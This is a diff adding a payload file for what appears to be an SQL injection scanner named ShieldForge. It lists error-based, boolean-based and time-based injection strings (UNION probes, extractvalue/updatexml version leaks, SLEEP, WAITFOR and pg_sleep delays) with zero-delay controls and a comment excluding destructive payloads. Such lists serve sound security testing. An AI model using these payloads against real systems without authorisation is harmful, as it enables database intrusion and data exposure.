@@ -1,0 +1,46 @@
+# ShieldForge - SQL Injection Payloads
+# Format: category|payload
+# Categories: error, boolean_true, boolean_false, time, time_control
+# Lines starting with # are ignored.
+# NOTE: no destructive payloads (DROP/DELETE/UPDATE/INSERT) belong in this file.
+# This module proves injection is possible - it never mutates target data.
+
+# --- Error-based: designed to break SQL syntax and surface DB errors ---
+error|'
+error|''
+error|"
+error|' OR '1'='1
+error|' OR '1'='1' --
+error|' OR '1'='1' #
+error|") OR ("1"="1
+error|' AND extractvalue(1, concat(0x7e, version()))--
+error|' AND updatexml(1, concat(0x7e, version()), 1)--
+error|' UNION SELECT NULL--
+error|' UNION SELECT NULL,NULL--
+error|' UNION SELECT NULL,NULL,NULL--
+
+# --- Boolean-based: paired true/false conditions for differential analysis ---
+boolean_true|' OR '1'='1
+boolean_true|' OR 1=1--
+boolean_true|' OR 'a'='a
+boolean_false|' OR '1'='2
+boolean_false|' OR 1=2--
+boolean_false|' OR 'a'='b
+
+# --- Time-based: deliberate delay payloads per DB engine ---
+# Each is paired with the "time_control" baseline payload to rule out
+# ordinary network/server latency before calling it a finding.
+time|' AND SLEEP(5)--
+time|' OR SLEEP(5)--
+time|'; WAITFOR DELAY '0:0:5'--
+time|' AND pg_sleep(5)--
+time|' || pg_sleep(5)--
+
+# time_control payloads must be syntactically identical in shape to the
+# time payloads above but with a 0-second delay, so the only difference
+# being measured is the delay amount itself, not the payload structure.
+time_control|' AND SLEEP(0)--
+time_control|' OR SLEEP(0)--
+time_control|'; WAITFOR DELAY '0:0:0'--
+time_control|' AND pg_sleep(0)--
+time_control|' || pg_sleep(0)--
